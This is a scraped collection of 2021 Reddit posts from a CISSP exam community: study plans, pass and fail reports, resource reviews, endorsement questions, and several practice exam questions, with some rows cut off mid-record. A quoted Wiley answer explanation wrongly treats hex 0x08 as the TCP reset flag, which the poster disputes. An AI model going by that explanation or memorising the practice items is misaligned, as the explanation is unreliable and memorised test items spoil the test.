1433,owdfw6,Fun CISSP Practice Question,"\*\*Admin(s) Please Delete If Not Helpful\*\*

By the end of 1989, the price of ROM chips was dropping enough that Capcom game designers Akira Nishitani and Akira Yasuda began their ambitious plan for Street Fighter 2. Senior management asked the two designers to stay in-line with the original game and keep it straight forward. Management also asked for a quick turnaround to compete with other upcoming game releases such as Midway’s Mortal Kombat.

While the designers wanted to stay within the confines of the original game structure, they also wanted the freedom to try new things during development with the new ROM chips. Their goal was to create a list of skilled and iconic characters each with their own special abilities. For example, the additional memory space allowed the character Guile to have his Low Kick flipped to look like an upside-down air kick. And as Dhalsim’s limbs started getting longer and longer with each development iteration, it could be counter-balanced by making the character move slower. E. Honda’s flying attack and Chun Li’s Spinning Bird Kick were also newly added memory spaces on the ROM boards. These moves pushed the game from realistic to unrealistic, and added to its charm.

48-bits of data were allocated on the game boards to accommodate these changes.

This resulted in characters slowly increasing their assigned memory while in production and sometimes required a quick fix. In order to make these constant changes, Nishitani and Yasuda needed an accelerated development process with the final end-result already defined, but with the flexibility to allow for improvements while prototyping designs, going back and cutting animation frames for memory conservation, and re-examining system motherboard architecture. The designers needed the ability to constantly build, demonstrate, and refine their game animation changes.

Which of the following software development models would best fit this environment?

A. Waterfall method  
B. Rapid Application Development  
C. Joint Application Development  
D. Spiral Model

1434,ou4xez,"Failed, 150 questions","So today I took my first CISSP exam and failed. I guess I am wondering is it possible to determine if I was close to passing or not? I was above proficiency on two domains, near proficiency on five domains and below proficiency on one domain. Now I understand that near proficiency isn’t enough but does near mean that I was a question or two off from being above? Ive read that if you are below on lower weighted domains it is possible that if you are above on higher weighted domains you can make up for it? 

How near to passing is ‘near proficiency’ 

I just wish they gave me a little more breakdown of how close I was exactly. I have been studying for the past 6 weeks( min. 4 hours a day) one week was a boot camp. I have 8 years security experience and 7 years system administration experience and thought I was doing everything right leading up to the exam. But after leaving the exam, I don’t know what to go back and review for my second attempt. Most of the questions were opinion based “choose BEST” answers which all of them were correct just had to choose the “more” correct answer. The domain I was below proficiency on , during my practice questions I was above 80% on, so I am just really discouraged and would appreciate any tips on how I should move forward.",2021-07-29
1435,p24uqd,Passed at 100 questions today,"I think the things that helped me the most

1. Consistent study plan over several months. One hour per day during work week.
2. Boson practice exams. Worth the 90 bucks. Definitely the most similar practice questions to the exam.
3. Larry greenblatt on YouTube. He is a little hippy dippy but give him atleast 40 minutes of your time before you move on. His mindset helps you choose the best answer when you narrow it down to two or three answers.
4. Luke ahmed “think like a manager” book. This helps you understand that you should always prioritize policies, thinking before you act, and risk management. Again, helps pick the best answer.
5. Read the questions twice, atleast! I passed at 100 questions at exactly two hours. There were two questions where i was like “ok no clue move on”. But for the others, especially the ones that seems way too easy, read it again! There are almost always two answers that are right. Ask yourself - which is more specific? Is one answer too generic that now the scope is huge and you would waste money? 
6. Wear contacts. My glasses fogged so bad and it was distracting because of covid.
7. Be prepared for some noise distractions and don’t let it ruin your exam. The person next to me cleared their throat every 30 seconds and I was so angry. I broke the marker. Took a deep breath. And told myself to never give up. And then I went back to it.
8. This is a technical exam! You should know how the technologies work. Study what you don’t know and do a deep dive. Worst case scenario you understand a security topic like PKI really well and you use it in your job 3 years from now.

I’m glad I passed. I honestly don’t know if I would have had the strength to keep studying and retake. For those of you that keep failing and keep trying - you are strong. Keep pursuing what is meaningful to you and don’t let anything ruin your relationships and whatever else is important to you.",2021-08-11
1436,ovm35i,Failed today at 150 questions,"Welp...i kinda saw that coming. I felt very unprepared the 2 weeks before the exam. The more i crammed, the less i felt like i knew. Practice tests range from 50-68%, which was discouraging. 

I have a bachelor's in business management (2011) and a masters in information technology systems (2020). I work as a research analyst for a small tech company. My everyday job isn't technical or managerial, but i have done some light technical work here and there for the company the past 9 years I've been there. I thought the test was pretty technical. Especially domain 4, my greatest nemesis. 

Started studying beginning of May. I tried to read the shon harris book, but was overwhelmed (only got through 1/2 book) At the end of may, i took a few practice tests and got around 50%. Only studied about 3hrs on a good day, much less or none on busy days. 

June, used the 11th hour to get to know the domains and then go into detail with videos, research, and shon harris book. Started doing practice test questions every other day. Was feeling better in June.... Then life happened. Didn't study for ~3 weeks. I kept thinking i had time left to study in july. 

July comes and things don't cool downwith life stuff. I was thinking of rescheduling but my mom convinced me to keep my date. It will force me to study, which i agreed with. Didn't get any better. Was only able to study everyday for ~3hr. 

Took a week off work before the exam to cram. That was the bulk of my study time, but even on the week of, i studied 5-6hr. 

I think the practice tests i used were representative of the exam. The sybex practice questions were pretty good, especially in how it is worded. The questions were similar, but the answer choices in the actual exam were more tricky.
They were not as obvious as the practice tests. I was able to narrow questions down to 2 answers. I took too much time in the beginning 50q and didn't have enough time for the rest of the test. Ended up rushing the last bit. 

Knew i failed when the last few questions were straight forward and much easier. Got a lot of legal and regulatory questions that i didn't know because glossed over those in my studies.

Study materials: 
Shon harris all in one CISSP (mostly used to do practice tests. Did ~700q)

11th hour

Sybex 3rd edition practice tests (did ~200 questions. Bought too late in July) 

Destination mind map videos (watched each vid 2x + took notes) 

Cissp cram series (watched each video 2x + followed slides)

Day before exam listed to how to think like a manager by Luke Ahmed and eric conrad's cissp cram session 

My plan for the 2nd time (hopefully last): 
Boot camp. I'm really bad with self study and need some structure. Plus, can tell people in my life i have to go to school for a chunk of time

More practice questions. Want to do all the questions i have

Look for an audio book version of a prep book 

Study things in detail. Deeper understanding of the WHY! 

TLDR: didn't study enough, didn't pass. Time management and discipline are important. Cramming didn't work :(",2021-08-01
1437,p7ugbs,For those of you who have passed - what resource do you feel helped you the most/was the most relevant?,"I am looking to take the exam within the next few weeks. I recently finished WGU's MS in CSIA which was designed around the CISSP domains. I also purchased the latest Sybex study guide (9th ed) + practice questions book (3rd ed). I feel like I have a pretty solid foundation, almost want to just go take it now to see how I do. But at $750 for the voucher, I should probably study a little while longer to maximize my chances of passing first time around. I do have some work experience related in the field which I am often thinking back to as I go through practice questions. 

So - those of you who passed and used multiple study resources - is there any one in particular you felt was the most helpful/relevant?",2021-08-20

1439,ouob9r,Provisionally Passed Yesterday @ 150 Questions,"Hello all. I have been quietly following the CISSP reddit thread for the past two years. Before I get into the journey, I will tell you about my background. I have been in the IT industry for 15 years wearing many hats along the way. I was a managed services network engineer for most of it, although I also worked on systems and security in these roles. I was also an ISO/IT Manager for about four years in the financial industry. I am currently working as a network engineer in the media and broadcast industry. I currently hold CCNP r/S, MCSA/MCSE 2016, A+, Network+ and CISM.

&#x200B;

I have been studying for the CISSP off and on for the last two years. I was hoping to test in early 2020, but the testing centers closed for a while due to COVID. I studied the official study guide (read it cover to cover) and finished the 11th hour by Eric Conrad. This took about two weeks. I tried to read the Shon Harris edition, but I wasn't captivated by the writing style. It felt like reading a dictionary. The official guide was still a hard read, but I was able to keep up with the progression. I also used several practice tests including: the official practice tests, Boson, Shon Harris practice questions and PocketPrep. I would test myself on random questions and when I did poorly, I would review chapter material or concepts.

&#x200B;

After I learned that ISACA allowed online testing, I scheduled my CISM test for May of 2020. Unfortunately, I had technical issues logging into the exam environment so I was not able to take the test. Support did issue me a voucher to retake the exam, but I did not end up taking the exam until April 2021. Not wanting my voucher to expire, I studied the All-In-One study book for the CISM and used the QAE question bank to help (re)prepare. I thought both were essential for passing the CISM exam. I was able to pass the CISM when I took it in April 2021; thankfully I had no technical issues this time. The proctor had me scan the room, under the desk, etc. to ensure a secure test environment at home. It took about two weeks to have my work experience approved, maintenance fees, etc. until I was finally CISM certified.

&#x200B;

I told my employer about my new credentials and my interest in cybersecurity management. They requested I take the CISSP as it was viewed as a harder tested (I'll comment on that later). I ordered the ninth edition of the Official study guide and started my studies with a focused approach on my weak domains. I continued to use my practice tests to focus on these areas. I used PocketPrep and Boson for most of it. When I started using Boson, I was averaging 60-70%. After two months of studying, I was able to bring that up to 80-90% on average. I bought the CCCure questions, but only used them a few times. I heard on this forum that Boson was the best and I agree with that. I finally decided to schedule a date and get it done. I picked 7/29 as my test date and I was a nervous wreck leading up to the exam date. I felt I understudied, unprepared, etc. even though I have been studying hard for the last several months. I read the 11th hour book cover to cover to brush up on my topics. I read this until the late morning on the day of my test. My test was at 2 PM. I also watched the Kelly (Why you will pass the CISSP) video and Larry's videos and they will essential for gaining the right mindset. DON'T FIX ANYTHING!!! Cost benefit analysis for each solution. Management answers are always applicable. Focus on human life.

&#x200B;

I did a few Boson practice questions in the parking to get into the mindset of reading the questions slowly (once, twice), reading the answers slowly (once, twice). All the time to think like a manager, not an engineer. My heart rate was up and I was stressing out. I finally made my way into the testing center for the moment of truth. After the palm scans, NDA and all the processing, I finally started the exam. What I read on this forum was accurate. These were like no questions I have ever seen in my practice test bank. I had a handful that were like that, but most were scenario based. You have to completely understand the concepts and when to use them. I would read the question two or three times, figure out what they were asking and then select the appropriate or best answer. I also proved the other answers were incorrect or less accurate than the answer I chose. Several questions were way out of left field and I used an educated guess to eliminate the wrong answers. After going past 100 questions, I really thought I was headed for failure. I was thinking, all that studying and it is still not enough. I even visualized my next steps, like attending a boot camp. Nevertheless, I continued to answer each question as if it would make or break my passing grade. I finally got to question 150 with about an hour left and clicked finish exam. I was surprised it didn't have a survey like the other exams I have taken.

&#x200B;

I had to go through the checkout process (ID and palm scans again). The proctor verified my name on the printout and I noticed when she was holding it, it did not have bar graphs like I heard similar to a failure report. When she handed it to me, I saw ""Congratulations"" and said aloud, ""Well I wasn't expecting that."" haha I'm so glad I stuck with it and continued to fight for the win. I feel the networking questions pushed me over the top since that is my strongest area. I know I didn't ace it at 100 questions, but I tried my best and that is all that mattered to me. I look forward to the future this certification will bring. If anyone has tips on staying on top of the CE's, I would greatly appreciate it.

&#x200B;

I feel the CISM will help prepare you for the CISSP, but while they are similar, they are also very different. The CISM is more management focused without the high level technical knowledge required for the CISSP. Both exams were very challenging. CISM is paramount if you plan to pursue a Infosec Manager role and analyzing/reporting risk to C-level executives. There is a lot of overlap between the two, but studying for one doesn't necessarily prepare you for the other without additional study.

&#x200B;

Whatever your journey may be, I wish you all the best and I'm happy to answer any questions that do no break the NDA.

1447,otq9aj,About a question from the Wiley CISSP test bank...,"Greetings everyone. I attempted the Bonus Exam from Wiley's Test Bank today, and one of the questions asked about a packet analysis scenario.

The questions goes like this:

>While performing network packet capture analysis, you discover packets that seem odd. By looking into the packet’s raw hex display, you see that the byte offset position 0x2F has the value of 0x08. What was this packet attempting to make occur?  
>  
>A. Abruptly disconnect a session  
>  
>B. Confirm the receipt of a data set  
>  
>C. Start a graceful hang-up process  
>  
>D. Initiate a new session connection

I pick A, the answer that this shows a reset, to abruptly end the connection, and Wiley says I'm right. It provides the following explanation which I'll copy and paste here:

>The raw hex value of 0x08 in offset position 0x2F represents the binary number of 00000100. When this binary number is compared to the TCP header flag (i.e., the offset position 0x2F) layout of XXUAPRSF, it is clear the Reset flag is set. Thus, this packet is attempting to abruptly disconnect a session.

This seems strange, because 0x08 is binary 00001000, so the explanation is one position off.

The layout of the control bits is correct, XXUAPRSF, and RST is indeed 00000100. But, that means the hex value should be 0x04 in both the question *and* the answer / explanation.

Furthermore, the offset position for the TCP header flag should be byte offset 13, i.e. TCP\[13\]. Why does it say offset position 0x2F?

It seems as if Wiley made several mistakes here. Either that, or I am losing my mind. Can you guys weigh in?

One last point is that I hardly think questions like this will appear in the actual exam. Packet analysis seems too far down in the weeds. What do you guys think?",2021-07-29

Does OSG 9th edition practice questions are enough or should I refer others too like ISC2 official practice tests, BOSON, Luke Ahmed, Pocket Prep, CISSPprep, Shon Harris questions & Thor teaches? (These lists are overwhelming and I'd like suggestions how can I filter it down to practice questions sets which is closer to the actual exam please?)

Appreciate all your advice.

Thanks",2021-08-03
1464,ounoel,Anyone practicing with Thor Pedersen's HARD CISSP Practice Questions?,"So my company offers Udemy for Business subscriptions. Through this I have been able to obtain some CISSP resources. Some of the available resources are Thor Pederen's HARD CISSP Practice Questions. So far these are the trickiest and most confusing practice questions I have come across during my prep. Sometimes I feel like they are purposely trying to trick me by using specific words which start to make me over think. I was wondering if anyone else has been using these and if they are also finding them confusing and also wondering how similar these will be to the actual questions I will see. I have provided a sample below.

 ""J**ohn is creating a username for a new employee, Frank Hornsby. The company guidelines recommend the username ""hornsbp1"". The new employee has requested the username ""cowboy"", and there are no accounts with that name. Which username is John most likely to create, and what is the BEST reason?** ""

a. Cowboys because guidelines are optional and cowboy is unique 

b. hornsbpi, because cowboy would be too conspicuous and may attract attackers

c.  hornsbpi, because this format follows the guidelines

d. cowboyl, because this almost follows the guidelines and would not be too conspicuous

I have been having the hardest time remembering certain topics in the book, like the access models. So I decided that in order for me to remember these boring topics, I am going to write a story and hopefully I will remember. By writing here I am hoping it will help you study as well! I don't know if this idea is stupid/silly but I'm hoping it will help remember at the least the name and what each model does! The story may sound silly because I am just making this shit up, also my grammar sucks so please excuse me but I will write in a way so that each model is memorable :)

If you all like this, I can write more about other topics, so here goes nothing!

\-------------------------------------

It was a cold winter night in Virginia but it was hotter than ever in Washington DC with cybersecurity incidents across the Federal government. Something had to be done or else the USA was to going to lose the war against its enemies on the cybers fronts. We could beat anyone in physical battle, but how do we beat an enemy who knows no boundaries that you can't shoot or kill by a stealth bomber or a drone?

After being in traffic for hours on 66 East by the Key Bridge near Georgetown, Mr. Bell LaPadula had enough and took the exit near Roslyn to cross the bridge. ""Big mistake"" he explained ""the damn traffic worse up in here!"" After moving an inch every 30 minutes, he remembered why took this exit. He loved the view of the Potomak river, as the sun rose up over Kenndy Center. It was better than looking at a parking lot of cars.

Noticing how late he was running for work, he had no choice but to call his best friend Biba, a goofball who saw Mr. LaPadulla as this big military prick but loved like a brother nonetheless. They have been arguing for days about how to solve these Cybersecurity incidents. His biggest worry was to prevent insider threats, there has been a fear that there are Chinese spies now working in the ranks of the US government, they had found a way to get in and now no one could be trusted, not even our own...

Bell and Biba have been working together with Clark Wilson, an AirForce retire who loved sports cars, more especially Camaros, and their nerdy twin buddies Brewer and Nash who were obsessed with the Great Wall of China, but for some odd reason they always referred to it as Chinese Wall, LaPadulla never asked why... Together they made a great team solving the hardest IT Security problems.

However, Mr. Goguen Mesegur, a kiss-ass who was a title whore in the government world, always got in the way of LaPadulla. No matter how great of an idea he had, Goguen stopped him in order to push his own agenda. His biggest supports were Graham Denning, an IT Manager, and Mrs. Sutherland, an old-school mean lady who smoked way too many cigarettes, the type of person you wondered how she was still alive after smoking packets of cigarettes per day for many many years! If she called, you could even smell the cigarettes from the phone as soon as she said ""hello darling...""

With that said, the most applicable credential to what I do now is the CISA, but everything I've heard suggests that it's not that challenging for someone with a strong auditing background.

However, I don't have a strong background in IT or good study skills, so I'm thinking that taking the Sec+ and Network+ first would make the most sense; the area I'm unfamiliar with is how much those two relate to the CISA.

I am part of a two man IT team and would've had my boss endorse me. the scope of my job very much includes security.

However, while I have 5 years of security experience, my boss is not an ISC member. I'm also not particularly looking to jump ship once I'm certified (though id make a lot more money if I did.) How do I get my skills endorsed when I pass the CISSP exam?

Can my boss endorse me without a CISSP himself?

Can I be endorsed by a third party ISC2 member? If so, what will I need to show them to prove my experience?

For example, in the past five years I have:

- earned a CRTP certification

- built and tuned a SIEM solution based on graylog, elasticbeats, sysmon, and graylog sidecar. This system uses SIEM rules translated from the sigma project (to which I am a github contributor)

- developed the incident response plans and playbooks for our organization (a few hundred pages worth)

- planned and implemented CCTV and access control systems for all of our sites...

- ... along with matching surveillance and privacy policies specific to our region (were a govt agency subject to strict privacy laws)

- top 500 member of hackthebox.eu since 2017

- set up and perform monthly vulnerability assessments

- replaced all our firewalls and audited their rules and configurations

- wrote the RFPs for several new projects (including disaster recovery)

- been the primary responder to several ransomware incidents (at my previous job at an MSP)

- Developed security awareness programs for our staff (both knowbe4 and live demos such as demonstrating USB HID attacks to staff)

- formally specialized in infosec during my computer science degree

- write infosec articles in my spare time, several of which have been cited by large organizations including infosecinstitute (not that i like infosecinstitute, but whatever)",2021-07-27

I see the posts on here with people passing, and I'm asking myself ""what am I doing wrong?""  I know the material really good but for some reason the questions I'm getting on the exam are just not going well for me,  it honestly did not feel like an overly hard test,  especially this time around but something is off.

1520,pabhis,Provisionally passed! Here's what worked for me.,"I provisionally passed!  I am posting this to give back because I found these kinds of posts motivating when I was preparing.  Also, it's a little cathartic.  Of course, your experience will be different but here's what worked for me.

For context, I have around 15 years of experience in cyber security technical and management roles, and had just never got around to doing the test.  Like others, booking a date helped sharpen my focus.  

I have experience in most of the domains except SDLC, so my study needs were to validate what I thought I knew and then to fill in gaps where I didn't have as much experience.  It turned out I had more gaps than expected in domains I thought I was strong in (eg. crypto), and fewer in the gaps where I thought I was weak (eg. SDLC).  I also have a lot of multiple choice test experience from other exams like the LSAT, and this definitely helped.

**My approach**

\- I did practice questions with the Pocket Prep app (now called IT & Security) to assess where I stood on the domains.

\- Then I zeroed in on my weak domains and topics I kept missing in practice.  I used ""70 Tips and Tricks for Mastering the CISSP Exam"" by R. Sarma Danturhi to get a good, concise overview of specific topics.

\- After reaching saturation on Pocket Prep I started doing the Boson practice exams.  I made careful notes from the Pocket Prep and Boson explanations of questions I missed, and made flashcards with a free app called Rolandos to drill on recurring gaps.

\- I prioritized rote memorization of only a handful of core concepts that practice exams showed I was likely to need.

**General advice**

\- **Plan and visualize your visit the day** before to minimize the mental load that will be on you that day.  Look up the exam site in google maps.  Check exterior and interior photos if there are any.  Figure out parking or transport and book in advance if you can.  Plan what you'll wear into the exam room which may be warm or cool (likely to be warm given the PCs used for the exams).  Gather your IDs (you likely need at least 2) and any needed supplies (water, protein bars, etc.) in a bag that can fit in a small storage locker.  Check Covid mask requirements.  

\- Prepare yourself mentally to do 150 questions and to push onward without hesitation or self-pity if you go past 100.  A pass is a pass.

\- To paraphrase Bruce Lee, avoid practicing while overly tired.  If I was too tired, my practice scores dipped, drove down my average, and demotivated me.  When this happened, I put everything away and came back the next day, but I also made sure this didn't become an easy excuse.

\- Don't cram.  The day before my exam, I stopped studying mid-day and binged Netflix with a bag of chips in the evening.  The morning of, I was tempted to do some last minute review but stopped.  I told myself 20-30 minutes of review wasn't going to make a difference and it didn't.

\- If you have to wear a mask, take time to find one you'll be comfortable in for 1-3 hours.

\- Be ready for some bad grammar on some questions and answers that impacts their meaning; you just have to deal with it as best you can.

\- Review at least one current study resource published within the last year to prevent you from being blindsided by a new cutting edge topic or technology.  I found Mike Chapple's LinkedIn videos good for this.

**What was useful**

\- The Pocket Prep app was my main weapon of choice.  It was on my phone so I could do a quick quiz whenever I had a few minutes of downtime.  I think this was critical to getting lots of reps in.  

\- The Boson practice exams were quite good because they were challenging and very different than the Pocket Prep questions.  It was a good way to double check I was where I thought I was on the domains, and it spotlighted some new topics I hadn't encountered before.  Check this subreddit for a current discount code before you buy.

\- Danturthi's book was good for concise summaries of key topics in each domain.  He also emphasizes reading questions carefully and refactoring them in your head to remove irrelevant language, which I thought was a sound approach.

\- I found Chapple's LinkedIn videos to be up to date, well presented, and detailed.  They were also indexed to make skipping to a specific subject easy.  However, I don't learn efficiently from videos so I mostly used these to zero in on specific topics.

\- Kelly Handerhan's ""Why You Will Pass"" is a free, short, and worthwhile YouTube watch, even if just to reinforce that you should think like a manager.  I am one, so this wasn't a stretch, but it is a critical mindset to bring into the exam.

\- There are some cheat sheet style summaries which are posted in this subreddit which I found to be helpful.

**What wasn't useful**

\- I did not find the official ISC2 study app to be useful.  It didn't offer different study modes or statistics, and I think the question banks in Pocket Prep and Boson are superior for learning the domains holistically.

\- I found Kelly Handerhan's Cybrary videos to be a bit too high level for me, but I think they would be a good entry point for someone new to the field.  Her videos are very down to earth and accessible.

\- I felt that the explanations in Pocket Prep and Boson adequately covered the Shon Harris and Chapple books, so I did not feel it necessary to buy them having drilled these apps.

I hope this is helpful! Good luck!",2021-08-24

Though this post is not about passing CISSP, but I attended my CISSP certifcation in 2018, continuously improve and learn. Being certified in CISSP isn't an end but a begin of your new journey. 

It opens you a doorway and demonstrate you have sufficient knowledge in various security domains (now 10?) and where  you can then focus on what you are lacking or you are interested further.

In between the years after certified in CISSP, I have also certified in ISACA's 5 CXXX exams. 

Excited to submit my final endsorment for ISC2 to review. 

And should I say ""graduate"" from ISC2?

For those who  are not yet ready for CISSP (CISSP is not a beginner certificate), it's ok,  you can try SSCP instead as a starting point, I would strongly recommended this (though it's not the path I have taken). But SSCP is a good interim step for you to prepare your CISSP if you don't have the full domain knowledge and experience.

1527,p8kknx,Passed at 150 8/18/21! Huge Thank You To this Sub and Few Lessons Learned,"I have been waiting to write this post for a long time. I'll try to keep it succint and useful.

Background: Retired Military with last 12 years in upper middle IT/Policy management.  Took a training camp CISSP boot camp one time a few years back before retiring. Didn't pass, it was the old 250 Q format and I scored a 600. Seeing as this course is now $5K I would not even consider it.

I knew it was passable so I set a goal to get it done. I didn't look to seriously complete that goal until around 3 months ago. Long before that I hung around this sub reading about people's successes and failures. I started in June, studied a few hours a day, with 80% of my study time devoted to the various question bank apps. I did these while on the stationary bike at the gym.

I probably bought EVERY resource on here and TRIED to get through all of them. Here's the rub...I DIDN'T NEED THEM ALL!!!  

This is where lessons learned come in, so here goes. 

1. Run your own race. Take a few practice tests and get a gauge on what you know. If you are scoring in the 50-60% rate at the start, you have a solid baseline to build on.
2. Once you get that baseline, SCHEDULE THE TEST. It is said so much here, but is the single biggest driver that will make you study.
3. THINK LIKE A MANAGER...but KNOW THE MATERIAL LIKE A TECHNICIAN. Just thinking like a manager will not get you through this test. There will be plenty of purely technical questions too.
4. The BEST study material/formats are the you ACTUALLY CONSISTENTLY DO. Don't waste money on stuff you aren't going to use. I have the shon harris book, sybex 8/9, the CBK...I got through about 30% of the content across all of these. The material bored me to tears. What I was able to consistently digest was practice questions with some delving to the books for problem areas. That said, know you will need to use SEVERAL sources...this is good for building your knowledge base, and getting used to different terms for the same thing. 
5. Don't take your practice test scores in relation to others here as some type of gospel as to whether you should test. Use them to gauge your knowledge. My highest score on Boson was 610, and my usual score was around 550. I only consistently scored in the 60s-70s on the Shon Harris online questions. Pocket prep was in the 70s too, only went up with repeat questions.
6. Do a PLEHORA of question across NUMEROUS sources. Not only does this build your knowledge base, it also builds your stamina for when you take the test. ALSO MEMORIZE the answers...people say don't that, but guess what, you are probably bound to get a few softball questions that you only get right because you memorized some obscure aspect of an answer. Learn why the answers are wrong but YES some rote memorization is required. You don't want to get a gimme vocabulary question wrong because you didn't do some basic memorizing.
7. Everyone's experience with the test is different! The test was definitely hard, but at no time did I feel like I was taking a different test that what I studied. It just fest like they worded the stuff differently. Pretty much 80% of my questions felt *vaguely familiar*.
8. Find a video bootcamp series or two and VIEW THEM IN THEIR ENTIRETY. I tried all of them and everyone learns different so you have to find the one that works for you. The right answer is the one you can get through, lol. I will just put my experience with these.                                                                         

*  Kelly Handerhan Cybrary, Rob Witcher(MindMap) --These people are doing the lord's work. I owe them largely for my pass
* Thor Pederson, I could not get through his udemy courses...hated his tests too...hhhmmm.
* Phrabh Nair -- couldn't get through his course
* Mike Chapple -- Nope couldn't get though his either
* Larry Greenblatt -- Maybe his live boot camp is better but the $99 package SUCKS! Dude is not funny! 80% nonsensical rambling, off topic banter and defensive driving class comedian level  humor, 20% actual usable insight into the test.
* That said I did at least 10% of every source I listed so take it for what that's worth.

This got real long real fast I guess the best advise is find the study materials that work for you, get a baseline and set a timeline to test, then STICK TO IT.

When you get weary, come here for motivation. That's it and THANK YOU!!!!!!!!!!",2021-08-21
1528,p8he4a,Passed in 100 @ 100,"Took my exam today at 1PM and got a provisional pass!

I feel like I did a solid amount of preparation and I also work in the security assessment space so wanted to take a stab at it without much study time. I started July 17th and gave myself a month. I wasn't sure on how confident I would feel in that time frame so I actually didn't register until August 10th. At that point I felt pretty confident in being able to tackle the exam, but from 8/10-8/19 I was eat/sleep/breath CISSP (wife wasn't a fan lol). The exam was definitely interesting. My last certification was Security+ and AWS:CCP which both are super straight forward. I did not feel that way about the CISSP. My confidence level was high on only about 50% of the questions.  

I used the following material for prep: Books: 11th hour (read entire thing in last 48 hours), OSG 8th edition (probably spent less than an hour in this book over my course of studies), Luke Ahmeds 25 question book  Questions: Official Practice Tests 3rd edition (answered \~200 questions from here); Wiley Practice Tests (\~1000 questions); Pocket Prep (all 800, app is at 96% correct), Discord questions (a lot); ISC2 app (\~500 questions)  Videos: Kelly H. - Cybrary CISSP; Mike Chapple - LinkedinLearning; Destination Certification; CISSP Exam CRAM series; Prabh Nair, Luke Ahmed, etc.; every think like a manager video I could find :) The video content was probably 100% the reason I passed  Filled a 70 page notebook with things I was writing down from videos and books; probably wrote out BCP and SDLC process 10x each

On 6/12/2021 I managed to get a free voucher to take the CISSP exam, but it was set to expire at the end of August. I booked an exam at a local test center on 8/18/2021. I spent $0 on additional resources. I did get the ISC2 Official Practice Test book from a coworker who has his cert. My primary resource was I watched the [""CISSP Exam Cram"" videos on YouTube](https://www.youtube.com/playlist?list=PL7XJSuT7Dq_XPK_qmYMqfiBjbtHJRWigD) but I only actually watched the videos for the first 6 domains and didn't watch any of those extra ones. I took the official practice tests for the videos I did watch and I was scoring in the 70%-80% range. I probably spent \~20-25 hours studying for the exam in total.

1531,p837ym,Passed in 100,"Passed CISSP Exam yesterday August 19 2021 in 100 questions.

For prep I used the sybex study guide 8th edition, and the online sybex practice bank included with the guide.

I read for about 1-2 hours a night most nights over the course of about three months. I did the written reviews and in-book chapter reviews at the end of each chapter. 

The last 5 days before the test I switched to the online tests. I did all of the individual chapter questions first, identified my two weakest chapters and re-reviewed them.

Then switched to the practice exams and did about three, again flagging and reviewing any concepts I was unsure of.

The exam felt difficult. I thought I actually failed when it ended at 100. I worked by eliminating wrong answers and reasoning the best choice among valid answers remaining.

I took about 90 minutes.

My advice to those preparing for the exam would be to expect the exam to be more of a reasoning exercise than memorization. The online practice exams all feel very route oriented. The actual test for me felt much more applied and required critical thinking to make the best possible choice with the limited information available. Try not to assume any facts— if it’s not explicitly written in the question you can’t assume it exists. Interestingly this skill of making critical judgments with limited time and info is required by security professionals.

Good luck!

2. Adam Gordon (ITPROTV, New 2021 version CISSP Fast-track Course)
3. Prabh Nair’s YouTube Videos - Very important, Do not skip these videos.
4. Destination Certification YouTube Videos - Watched these videos many at times during preparation. Watched few videos night before exam also and they were spot on.
5. Mike Chapple last minute exam review
6. 11th hour CISSP and Memory palace by Prashant Mohan
7. And bunch of random Google search, Wikipedia, and YouTube videos.

Initially I started marking on book but soon I realized, it was going into my volatile memory. I needed it in my secondary memory so I started writing notes for each domain and they helped me a lot. This was the best decision of mine.

Group study on google meet for 2 weeks with 2 other aspirants. We studied for almost 3 hours daily and 8 hours on weekend just 3 weeks before the exam. Best part is, all 3 of us PASSED. I am sure they are reading my post right now ;)

My discord group is still active where many people are preparing to appear for the exam.

**About the exam:** It’s true that the real questions are different than the practice ones however; if your concept is clear then you would be able to rule out at least 2 options most of the time. Read questions carefully. Keep maximum 1 minute for each question and if you take more than that then cover that gap with the straight forward questions. Watch these 3 videos for the right mindset before you go for the exam–

Please focus on each topic and try to understand in detail. Write notes, read your notes daily, ask question to yourself and give answer to yourself. If you are satisfied with your answer, you are good to go. Pay special attention to words which have synonyms mentioned in the book.

I am happy to answer your questions while ensuring that I remain compliant towards the Code of Ethics. Good luck with your studies.

1555,p4dg4h,Another passed at 100 questions,"Passed yesterday after 100 questions in about 1 hour, 15 minutes. Background for me is about 14 years experience with virtualization, cloud computing, network security and consulting.

Spent 2 weeks studying for the SSCP and after passing that exam, spent another 6 weeks studying for the CISSP.  My study process was the following:

&#x200B;

* Read the AIO guide twice (should have read this second since it was more detailed than the official study guide)
* Read the official study guide fully once and skimmed through twice after
* Watched the Cybrary videos
* Watched the Mike Chapple CISSP linked in learning videos
* Watched the Prabh Nair CISSP videos
* Used the official Sybex practice questions, pocket prep questions and Boson questions
* Anytime I ran into topics I didn’t know, I would thoroughly research them
* Jotted down the order of difficult topics like BCP, Risk Management etc.

Now for the exam itself. First pointer is that I’d recommend your ID isn’t expired because I had to race back home and grab my passport which wasn’t fun.

Since this is an adaptive exam and the questions vary, I know some people have had an easy time with the exam and some people had a hard time with it. I had a hard time with it. After about 10 questions I was thinking to myself that I’m probably going to fail and there goes a lot of money down the drain. I also freaked out because I couldn’t see how I could possibly prepare more. But I took each question one at a time and used process of elimination to narrow down the choices and pick the most appropriate answer.   I heard that the questions start easy and get harder as you go but I had a mix of easy and hard questions.   The reason I found it so difficult was that the real questions were totally unlike the practice questions I was taking. The practice questions typically have 1 or 2 obvious answers, but there were about 40 questions that had all 4 answers as plausible. Designers of the practice questions really need to up the difficulty level on them.

Anyways, based on my experience, here are some tips:

&#x200B;

* There were many questions that used alternate terms for technology or controls, so pay attention to the study guide sections where they will say, “this term could also be called…”
* When you have 4 plausible answers, you really need to focus on the question and what it’s asking for: What is the most cost efficient, what provides the most protection (rather than detection) etc.
* It’s been said before but focus on answers that protect people, avoid risk and achieve desired management outcomes - sometimes that’s only way you can pick your answer
* Most of the questions were about concepts but you will see deeper technical questions thrown in so be prepared
* You will probably see concepts you’ve never seen or heard of before, and you’ll have to use your English comprehension skills to pick the one that sounds the most correct
* Focus a lot of your studying on how the technologies and security controls work together and why you would use them, rather than how they work
* A lot of the methodologies and frameworks are different for each organization but you should get a rough idea of what order certain activities will be carried out in
* Study everything - I had 3 questions on a topic that’s only a paragraph in most books

Hope this helps any future test goers.",2021-08-14
1556,p4k8rc,Feeling unprepared for my upcoming test. Should I cancel?,"Update: Decided to go ahead and take the exam today despite feeling certain that I would fail. I ended up passing at 100 questions with about an hour to spare. I was actually quite surprised by how easy the exam was. This seems like an exam where the preparation is the most daunting part given the volume of info that you might encounter on the exam. Thanks for all the comments and advice prior to the exam!

Posted this elsewhere but looking for a few more opinions.

